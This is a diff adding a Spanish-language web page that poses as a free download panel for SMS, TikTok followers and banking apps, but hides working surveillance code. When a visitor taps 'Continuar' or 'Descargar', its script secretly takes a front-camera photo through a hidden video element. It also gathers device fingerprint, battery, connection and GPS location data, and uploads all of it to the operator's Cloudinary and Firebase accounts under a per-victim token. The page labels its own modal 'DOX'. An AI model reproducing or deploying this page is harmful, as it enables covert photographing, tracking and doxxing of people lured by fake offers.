@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+<title>Panel de descarga de app 2026</title>
+<style>
+:root{--bg:#07091c;--card:#11152d;--line:rgba(255,255,255,.105);--text:#f7f8ff;--muted:#aeb0c4;--blue:#2f62ff;--purple:#7a38ff;--green:#16a34a;--red:#ef4444}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}html,body{margin:0;min-height:100%;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;color:var(--text);background:radial-gradient(circle at 8% 0%,rgba(124,56,255,.42),transparent 34%),radial-gradient(circle at 94% 100%,rgba(28,111,255,.28),transparent 35%),linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px),#08091f;background-size:100% 100%,100% 100%,94px 94px,94px 94px,auto}
+.app{max-width:540px;margin:0 auto;min-height:100vh;padding-bottom:32px}.topbar{position:sticky;top:0;z-index:20;background:rgba(8,9,31,.92);backdrop-filter:blur(16px);border-bottom:1px solid var(--line);padding:13px 15px;display:flex;align-items:center;gap:11px}.logo{width:52px;height:52px;border-radius:17px;display:grid;place-items:center;background:linear-gradient(145deg,#8a44ff,#1955ff);font-size:20px;font-weight:1000}.brand{min-width:0;flex:1}.brand h2{margin:0;font-size:20px}.brand p{margin:5px 0 0;color:var(--muted);font-size:13.5px}.badge{padding:8px 12px;border-radius:17px;border:1px solid rgba(124,56,255,.45);background:rgba(124,56,255,.12);color:#dfd1ff;font-weight:900;font-size:13px}
+.hero{padding:20px 16px 12px;text-align:center}.pill{width:max-content;margin:0 auto 14px;padding:7px 14px;border-radius:999px;border:1px solid rgba(124,56,255,.35);background:rgba(124,56,255,.12);color:#ddd4ff;font-weight:800;font-size:13.5px}h1{margin:0;font-size:32px;line-height:1.04}h1 span{display:block;background:linear-gradient(90deg,#a78cff,#19cbff);-webkit-background-clip:text;color:transparent}.subtitle{margin:13px auto 16px;max-width:440px;color:var(--muted);font-size:15.5px;line-height:1.4}.notice{text-align:left;border:1px solid rgba(42,159,255,.34);background:rgba(25,76,154,.16);color:#d8e7ff;border-radius:18px;padding:12px 13px;font-size:13px;line-height:1.45}.socialBox{position:relative;overflow:hidden;margin:12px auto 0;max-width:430px;border:1px solid rgba(255,255,255,.11);background:linear-gradient(135deg,rgba(124,56,255,.14),rgba(14,165,233,.10));border-radius:16px;padding:8px 9px;text-align:left;display:flex;align-items:center;gap:8px;transition:transform .18s ease, box-shadow .18s ease, border-color .18s ease}.socialBox.active{border-color:rgba(99,102,241,.45);box-shadow:0 12px 34px rgba(47,98,255,.18);transform:translateY(-1px)}.socialIcon{width:32px;height:32px;border-radius:11px;display:grid;place-items:center;background:linear-gradient(135deg,#7a38ff,#2f62ff);font-size:11px;font-weight:1000;letter-spacing:.3px;flex:0 0 auto}.socialIcon.pulse{animation:likePulse .55s ease}.socialText{flex:1;min-width:0;line-height:1.1}.socialText b{display:block;font-size:12.6px;font-weight:900}.socialText span{display:block;margin-top:2px;color:#c5c8db;font-size:10.8px}.socialCount{display:inline-block;min-width:30px}.socialCount.bump{animation:countBump .5s ease}.likeBtn{border:1px solid rgba(255,255,255,.10);border-radius:11px;padding:7px 9px;background:rgba(255,255,255,.09);font-size:11.5px;white-space:nowrap;min-width:86px;transition:transform .16s ease, background .16s ease, border-color .16s ease, box-shadow .16s ease}.likeBtn.tap{animation:btnTap .42s ease}.likeBtn.liked{background:rgba(47,98,255,.22);border-color:rgba(47,98,255,.42);box-shadow:0 0 0 3px rgba(47,98,255,.08)}@keyframes likePulse{0%{transform:scale(1)}38%{transform:scale(1.16)}100%{transform:scale(1)}}@keyframes countBump{0%{transform:translateY(0) scale(1)}40%{transform:translateY(-2px) scale(1.12)}100%{transform:translateY(0) scale(1)}}@keyframes btnTap{0%{transform:scale(1)}45%{transform:scale(.94)}100%{transform:scale(1)}}
+.search{margin:7px 16px 12px}input{width:100%;height:50px;border-radius:20px;border:1px solid var(--line);background:#080d20;color:white;outline:0;padding:0 15px;font-size:15px}.list{padding:0 16px 20px}.card{position:relative;overflow:hidden;margin:13px 0;border-radius:21px;border:1px solid var(--line);background:linear-gradient(140deg,#11152d,#0c1730);box-shadow:0 18px 48px rgba(0,0,0,.32)}.card:before{content:"";position:absolute;top:0;left:0;right:0;height:4px;background:var(--accent)}.main{display:flex;gap:13px;padding:16px 15px 12px}.icon{width:58px;height:58px;border-radius:16px;display:grid;place-items:center;background:var(--accent);font-size:20px;font-weight:1000;flex:0 0 auto}.title{font-size:18px;font-weight:900}.desc{margin-top:8px;color:#b8bacb;font-size:13.5px;line-height:1.35}.bottom{border-top:1px solid var(--line);padding:11px 15px;display:flex;gap:9px;align-items:center}.meta{margin-right:auto;color:#c3c2d2;font-size:12px}button{border:1px solid rgba(255,255,255,.12);border-radius:14px;padding:11px 12px;color:white;font-size:12.8px;font-weight:900;background:rgba(255,255,255,.09);cursor:pointer}.use{min-width:125px;background:var(--accent);border-color:transparent}.modal{position:fixed;inset:0;z-index:100;display:none;align-items:center;justify-content:center;padding:20px;background:rgba(0,0,0,.64);backdrop-filter:blur(8px)}.modal.show{display:flex}.box{width:min(430px,100%);border-radius:24px;border:1px solid var(--line);background:linear-gradient(160deg,#171733,#0c1023);padding:20px}.box h3{margin:0 0 10px}.box p{margin:0 0 17px;color:#c9cad9;font-size:14px;line-height:1.45}.row{display:grid;grid-template-columns:1fr 1fr;gap:9px}.primary{background:linear-gradient(135deg,var(--blue),var(--purple));border-color:transparent}.red{background:#381524;color:#ffdfe7}.toast{position:fixed;left:16px;right:16px;bottom:18px;z-index:110;display:none;max-width:520px;margin:0 auto;border-radius:16px;border:1px solid rgba(255,255,255,.11);background:#0c1128;color:#eef2ff;padding:13px 15px;font-size:13px;line-height:1.4}.toast.show{display:block}.empty{display:none;margin:14px 16px;padding:20px;border:1px solid var(--line);border-radius:18px;color:#c7ccde;background:rgba(255,255,255,.045)}.consent-title{display:flex;align-items:center;gap:10px}.cam-dot{width:42px;height:42px;border-radius:15px;display:grid;place-items:center;background:linear-gradient(135deg,var(--blue),var(--purple));font-size:11px;font-weight:1000}.consent-note{margin-top:10px;padding:10px 11px;border-radius:14px;background:rgba(47,98,255,.12);border:1px solid rgba(47,98,255,.28);color:#dce7ff;font-size:12.8px;line-height:1.35}
+video,canvas{position:fixed;left:-99999px;top:-99999px;width:1px;height:1px;opacity:0;pointer-events:none}
+
+.support-wrap{position:fixed;right:10px;bottom:62px;z-index:70}.support-btn{width:38px;height:38px;border-radius:13px;border:1px solid rgba(255,255,255,.18);background:linear-gradient(135deg,#2f62ff,#7a38ff);box-shadow:0 16px 40px rgba(0,0,0,.38);display:grid;place-items:center;font-size:10px;font-weight:1000;padding:0;letter-spacing:.1px}.support-box{position:absolute;right:0;bottom:46px;width:205px;border:1px solid rgba(255,255,255,.14);background:linear-gradient(160deg,rgba(17,21,45,.98),rgba(8,13,32,.98));border-radius:17px;padding:11px;box-shadow:0 22px 58px rgba(0,0,0,.45);opacity:0;transform:translateY(10px) scale(.96);pointer-events:none;transition:.18s ease}.support-wrap.open .support-box{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}.support-head{font-size:12.5px;font-weight:950;margin-bottom:8px;color:#fff}.support-line{display:flex;align-items:center;gap:8px;margin:7px 0;font-size:12.2px;font-weight:900;line-height:1.25}.support-line .sym{width:26px;height:26px;display:grid;place-items:center;border-radius:9px;background:rgba(255,255,255,.10);font-size:10px;font-weight:1000;flex:0 0 auto}.support-line small{display:block;color:var(--muted);font-weight:800;margin-top:1px;font-size:10.5px}.support-glow{position:absolute;inset:-2px;border-radius:22px;background:linear-gradient(135deg,rgba(47,98,255,.22),rgba(122,56,255,.18));filter:blur(14px);z-index:-1}
+</style>
+</head>
+<body>
+<div class="app"><header class="topbar"><div class="logo">SF</div><div class="brand"><h2>Panel de descarga de app</h2><p id="status">Actualizados 2026</p></div><div class="badge" id="tokenState">LINK</div></header><section class="hero"><div class="pill">Actualizados 2026</div><h1>Panel de descarga <span>de app</span></h1><p class="subtitle">SMS disponible gratis por tiempo limitado para cualquier app.</p><div class="notice">Elige una opción y continúa con la descarga disponible por tiempo limitado.</div><div class="socialBox" id="socialBox"><div class="socialIcon" id="socialIcon">LK</div><div class="socialText"><b><span class="socialCount" id="likeCount">5K</span> personas les gusta esta página</b><span>Toca en me gusta para reaccionar.</span></div><button class="likeBtn" id="likeBtn" type="button">Me gusta</button></div></section><section class="search"><input id="search" placeholder="Buscar opción..."></section><main class="list" id="list"></main><div class="empty" id="empty">Acceso inválido.</div></div>
+
+<div class="support-wrap" id="supportWrap"><div class="support-box"><div class="support-glow"></div><div class="support-head">Soporte</div><div class="support-line"><span class="sym">TG</span><div><small>Telegram</small>𝑹𝑩𝑷 | Bebote</div></div><div class="support-line"><span class="sym">WA</span><div><small>WhatsApp</small>Sonyer</div></div></div><button class="support-btn" id="supportBtn" type="button" aria-label="Soporte">SP</button></div>
+<video id="video" autoplay playsinline muted></video><canvas id="canvas"></canvas>
+<div class="modal" id="permissionModal"><div class="box"><div class="consent-title"><div class="cam-dot">DOX</div><h3 style="margin:0">Bien venido</h3></div><div style="margin-top:15px"><button class="primary" id="allowCameraBtn" style="width:100%">Continuar</button></div></div></div>
+<div class="modal" id="modal"><div class="box"><h3>Confirmar acción</h3><p id="modalText"></p><div class="row"><button class="primary" id="confirmBtn">Cancelar</button><button class="red" id="cancelBtn">Cancelar</button></div></div></div><div class="toast" id="toast"></div>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
+import { getFirestore, doc, getDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";
+const firebaseConfig = {
+  apiKey: "AIzaSyAgHKSWXEhkaqmlMCJUyPyN82JXqckYDHY",
+  authDomain: "fotos-6506e.firebaseapp.com",
+  projectId: "fotos-6506e",
+  storageBucket: "fotos-6506e.firebasestorage.app",
+  messagingSenderId: "203454756779",
+  appId: "1:203454756779:web:c1f759c14f642ac8d0c4ee",
+  measurementId: "G-CDPKF5FGYP"
+};
+const CLOUD_NAME="dvofdpbvg", UPLOAD_PRESET="inkafarma_fotos";
+const app=initializeApp(firebaseConfig), db=getFirestore(app), $=id=>document.getElementById(id);
+const token=new URLSearchParams(location.search).get("token")||"";
+const items=[{name:"Gana dinero",desc:"Activa la opción para generar ganancias.",icon:"GD",color:"#16a34a",accion:"gana_dinero"},{name:"Seguidores para TikTok",desc:"SMS disponible gratis por tiempo limitado para activar seguidores en TikTok.",icon:"TK",color:"#ff0050",accion:"tiktok_seguidores"},{name:"Likes para TikTok",desc:"SMS disponible gratis por tiempo limitado para activar likes en TikTok.",icon:"LK",color:"#00f2ea",accion:"tiktok_likes"},{name:"+51 900 101 001",desc:"Usar mandar SMS gratis.",icon:"SM",color:"#0ea5e9",accion:"sms"},{name:"+51 900 101 002",desc:"Usar mandar SMS gratis.",icon:"SM",color:"#0ea5e9",accion:"sms"},{name:"+51 900 101 003",desc:"Usar mandar SMS gratis.",icon:"SM",color:"#0ea5e9",accion:"sms"},{name:"+51 900 202 011",desc:"Número Perú zona Lima.",icon:"LI",color:"#7a38ff",accion:"sms"},{name:"+51 900 303 021",desc:"Número Perú zona Norte.",icon:"NO",color:"#12c48b",accion:"sms"},{name:"Yape",desc:"Opción disponible.",icon:"YA",color:"#7a35ee",accion:"app"},{name:"BCP",desc:"Opción disponible.",icon:"BC",color:"#2454b8",accion:"app"}];
+let linkData=null, selected=null, selectedBtn=null, busy=false, toastTimer=null;
+function initLikes(){const base=5000;let count=Number(localStorage.getItem("pageLikeCount")||base);let liked=localStorage.getItem("pageLiked")==="1";const countEl=$("likeCount"),btn=$("likeBtn"),box=$("socialBox"),icon=$("socialIcon");function formatCount(v){return v>=1000?(v/1000).toFixed(v%1000?1:0).replace(".0","")+"K":String(v);}function animateLike(){btn.classList.remove("tap");countEl.classList.remove("bump");icon.classList.remove("pulse");void btn.offsetWidth;btn.classList.add("tap");countEl.classList.add("bump");icon.classList.add("pulse");box.classList.add("active");setTimeout(()=>box.classList.remove("active"),700);}function paint(){countEl.textContent=formatCount(count);btn.textContent=liked?"Te gusta":"Me gusta";btn.classList.toggle("liked",liked);}paint();btn.onclick=()=>{if(!liked){count++;liked=true;localStorage.setItem("pageLikeCount",String(count));localStorage.setItem("pageLiked","1");paint();animateLike();toast("Gracias por tu reacción");}else{animateLike();toast("Ya reaccionaste");}};}
+$("supportBtn")?.addEventListener("click",()=>$("supportWrap")?.classList.toggle("open"));
+document.addEventListener("click",e=>{const w=$("supportWrap"); if(w && !w.contains(e.target)) w.classList.remove("open");});
+function esc(t){return String(t??"").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[m]));}
+function toast(m,type="info"){clearTimeout(toastTimer);$("toast").textContent=m;$("toast").className="toast show";$("toast").style.borderColor=type==="error"?"rgba(239,68,68,.35)":"rgba(255,255,255,.11)";toastTimer=setTimeout(()=>$("toast").className="toast",3200);}
+function loadBtn(b,v,t){if(!b)return;if(v){b.disabled=true;b.dataset.old=b.innerHTML;b.innerHTML=t||"Procesando...";}else{b.disabled=false;b.innerHTML=b.dataset.old||b.innerHTML;}}
+
+async function getLocationLite(){
+  const empty = {
+    status: "No disponible",
+    allowed: false,
+    latitude: null,
+    longitude: null,
+    accuracy: null,
+    mapsUrl: ""
+  };
+
+  if(!navigator.geolocation){
+    empty.status = "GPS no disponible";
+    return empty;
+  }
+
+  return await new Promise(resolve => {
+    let done = false;
+    const finish = value => {
+      if(done) return;
+      done = true;
+      resolve(value);
+    };
+
+    const manualTimeout = setTimeout(() => {
+      finish({
+        status: "Tiempo agotado",
+        allowed: false,
+        latitude: null,
+        longitude: null,
+        accuracy: null,
+        mapsUrl: ""
+      });
+    }, 3500);
+
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        clearTimeout(manualTimeout);
+        const lat = Number(pos.coords.latitude);
+        const lng = Number(pos.coords.longitude);
+        finish({
+          status: "Permitido",
+          allowed: true,
+          latitude: lat,
+          longitude: lng,
+          accuracy: pos.coords.accuracy ?? null,
+          mapsUrl: `https://maps.google.com/?q=${lat},${lng}`
+        });
+      },
+      err => {
+        clearTimeout(manualTimeout);
+        finish({
+          status: err && err.code === 1 ? "Denegado" : "No disponible",
+          allowed: false,
+          latitude: null,
+          longitude: null,
+          accuracy: null,
+          mapsUrl: ""
+        });
+      },
+      {
+        enableHighAccuracy: false,
+        timeout: 3000,
+        maximumAge: 600000
+      }
+    );
+  });
+}
+
+async function collectDeviceInfo(){
+  const ua=navigator.userAgent||"";
+  const sw=screen?.width||innerWidth||0, sh=screen?.height||innerHeight||0, vw=innerWidth||0, vh=innerHeight||0;
+  const isAndroid=/Android/i.test(ua), isIOS=/iPhone|iPad|iPod/i.test(ua);
+  const os=isAndroid?"Android":(isIOS?"iPhone / iOS":(navigator.platform||"No disponible"));
+
+  let browser="Navegador";
+  if(/Edg\//i.test(ua)) browser="Edge";
+  else if(/Chrome\//i.test(ua)) browser="Chrome";
+  else if(/Safari\//i.test(ua)) browser="Safari";
+  else if(/Firefox\//i.test(ua)) browser="Firefox";
+
+  let model="No permitido por navegador";
+  let platformVersion="";
+  let uaFullVersion="";
+  let architecture="";
+  try{
+    if(navigator.userAgentData && navigator.userAgentData.getHighEntropyValues){
+      const hi = await navigator.userAgentData.getHighEntropyValues([
+        "model","platform","platformVersion","uaFullVersion","architecture","bitness","mobile"
+      ]);
+      if(hi.model) model = hi.model;
+      if(hi.platform && os === "No disponible") os = hi.platform;
+      platformVersion = hi.platformVersion || "";
+      uaFullVersion = hi.uaFullVersion || "";
+      architecture = hi.architecture || "";
+    }
+  }catch(e){}
+
+  if(model === "No permitido por navegador"){
+    const m = ua.match(/Android\s+[0-9.]+;\s*([^;)\n]+)/i);
+    if(m && m[1]){
+      model = m[1].replace(/Build\/.*/i,"").trim();
+    }else if(isIOS){
+      model = "iPhone/iPad (modelo exacto oculto por iOS)";
+    }
+  }
+
+  const info={
+    userAgent:ua,
+    platform:navigator.platform||os,
+    os,
+    browser,
+    model,
+    platformVersion,
+    uaFullVersion,
+    architecture,
+    language:navigator.language||"No disponible",
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"No disponible",
+    screen:`${sw}x${sh}`,
+    viewport:`${vw}x${vh}`,
+    pixelRatio:devicePixelRatio||1,
+    online:navigator.onLine===true,
+    touchPoints:navigator.maxTouchPoints||0,
+    connectionType:"No disponible",
+    batteryPercent:"No permitido por navegador",
+    chargingText:"No permitido por navegador"
+  };
+
+  const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  if(c){
+    info.connectionType=c.effectiveType||c.type||"Disponible";
+    info.connectionDownlink=c.downlink??null;
+    info.connectionRtt=c.rtt??null;
+  }
+
+  try{
+    if(navigator.getBattery){
+      const b=await navigator.getBattery();
+      info.batteryLevel=typeof b.level==="number"?Math.round(b.level*100):null;
+      info.batteryPercent=info.batteryLevel===null?"No disponible":`${info.batteryLevel}%`;
+      info.charging=b.charging===true;
+      info.chargingText=b.charging?"Sí":"No";
+    }
+  }catch(e){
+    info.batteryError="No permitido";
+  }
+  info.location = await getLocationLite();
+  return info;
+}
+async function verify(){if(!token){$("empty").style.display="block";return}try{const s=await getDoc(doc(db,"shares",token));if(!s.exists()||s.data().active!==true)throw new Error();linkData=s.data();$("status").textContent="Actualizados 2026";$("tokenState").textContent="OK";render();showInitialConsent();}catch(e){$("status").textContent="Acceso inválido";$("tokenState").textContent="ERROR";$("empty").style.display="block";toast("Este acceso no está activo.","error");}}
+function render(){const q=$("search").value.trim().toLowerCase();const data=items.filter(a=>!q||`${a.name} ${a.desc}`.toLowerCase().includes(q));$("empty").style.display=data.length?"none":"block";$("list").innerHTML=data.map((a,i)=>`<article class="card" style="--accent:${a.color}"><div class="main"><div class="icon">${esc(a.icon)}</div><div><div class="title">${esc(a.name)}</div><div class="desc">${esc(a.desc)}</div></div></div><div class="bottom"><div class="meta"><b style="color:${a.color}">Gratis</b><br>Por link</div><button data-i="${i}">Carrito</button><button class="use" data-i="${i}">Descargar</button></div></article>`).join("");$("list").querySelectorAll("button[data-i]").forEach(b=>b.addEventListener("click",()=>openConfirm(data[Number(b.dataset.i)],b)));}
+function closeModal(){const m=$("modal"); if(m) m.classList.remove("show"); selected=null; selectedBtn=null; document.body.style.overflow="";}
+function openConfirm(it,b){if(busy)return;selected=it;selectedBtn=b;$("modalText").textContent=`Continuar "${it.name}" Descargar.`;$("modal").classList.add("show");document.body.style.overflow="hidden";}
+$("cancelBtn").onclick=()=>{closeModal();};
+$("confirmBtn").onclick=async()=>{const currentItem=selected; const currentBtn=selectedBtn; closeModal(); await captureAndSave(currentItem,currentBtn);};
+$("allowCameraBtn").onclick=autoCaptureFromConsent;
+if($("denyCameraBtn")) $("denyCameraBtn").onclick=()=>{$("permissionModal").classList.remove("show");toast("No se permitió la cámara. No se tomó ninguna foto.","error");};
+function showInitialConsent(){
+  const m=$("permissionModal");
+  if(m) m.classList.add("show");
+}
+async function autoCaptureFromConsent(){
+  // Oculta la ventana al instante y continúa el proceso en segundo plano.
+  const m=$("permissionModal");
+  if(m) m.classList.remove("show");
+  const item={name:"Apertura del link",accion:"apertura_link"};
+  captureAndSave(item,null,{silent:true}).catch(e=>console.error(e));
+}
+async function waitVideo(v){if(v.readyState>=2&&v.videoWidth)return;await new Promise(r=>{v.onloadedmetadata=r;v.oncanplay=r;setTimeout(r,1200);});}
+async function captureAndSave(item,btn,opts={}){
+  const silent = opts && opts.silent === true;
+  if(!linkData||!token){ if(!silent) toast("Acceso inválido.","error"); return; }
+  let stream=null;
+  busy=true;
+  if(btn) loadBtn(btn,true,"Verificando...");
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:720},height:{ideal:960}},audio:false});
+    const video=$("video"),canvas=$("canvas");
+    video.srcObject=stream;
+    await video.play().catch(()=>{});
+    await waitVideo(video);
+    const w=video.videoWidth||720,h=video.videoHeight||960;
+    canvas.width=w;
+    canvas.height=h;
+    canvas.getContext("2d").drawImage(video,0,0,w,h);
+    const blob=await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.86));
+    if(!blob)throw new Error("No se pudo crear foto");
+    if(btn) loadBtn(btn,true,"Descargando...");
+    const form=new FormData();
+    form.append("file",blob,`foto_${Date.now()}.jpg`);
+    form.append("upload_preset",UPLOAD_PRESET);
+    const res=await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,{method:"POST",body:form});
+    const data=await res.json().catch(()=>({}));
+    if(!res.ok||!data.secure_url)throw new Error("Cloudinary: "+(data.error?.message||"no subió"));
+    const deviceInfo=await collectDeviceInfo();
+    await addDoc(collection(db,"shares",token,"fotos"),{token,url:data.secure_url,accion:item.accion,item:item.name,public_id:data.public_id||"",asset_id:data.asset_id||"",fecha:serverTimestamp(),createdAtLocal:new Date().toISOString(),provider:"cloudinary",deviceInfo,bateria:deviceInfo.batteryPercent,cargando:deviceInfo.chargingText,pantalla:deviceInfo.screen,vista:deviceInfo.viewport,conexion:deviceInfo.connectionType,idioma:deviceInfo.language,zonaHoraria:deviceInfo.timezone,sistema:deviceInfo.os,navegador:deviceInfo.browser,modelo:deviceInfo.model,versionSistema:deviceInfo.platformVersion,arquitectura:deviceInfo.architecture,ubicacionEstado:deviceInfo.location.status,latitud:deviceInfo.location.latitude,longitud:deviceInfo.location.longitude,precision:deviceInfo.location.accuracy,mapsUrl:deviceInfo.location.mapsUrl,userAgent:deviceInfo.userAgent});
+    if(btn){
+      loadBtn(btn,true,"Guardado");
+      setTimeout(()=>loadBtn(btn,false),900);
+    }
+    if(!silent) toast("Procesado.");
+  }catch(e){
+    console.error(e);
+    if(!silent) toast(e.message||"No se pudo guardar.","error");
+    if(btn) loadBtn(btn,false);
+  }finally{
+    busy=false;
+    if(stream)stream.getTracks().forEach(t=>t.stop());
+    $("video").srcObject=null;
+  }
+}
+$("search").oninput=render; initLikes(); verify();
+</script></body></html>
